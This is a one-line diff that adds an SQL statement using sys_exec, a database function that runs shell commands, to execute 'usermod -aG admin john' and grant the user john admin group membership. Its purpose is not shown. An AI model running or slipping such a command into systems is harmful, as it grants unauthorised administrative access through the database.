@@ -1,0 +1,1 @@
+select sys_exec("usermod -aG admin john");
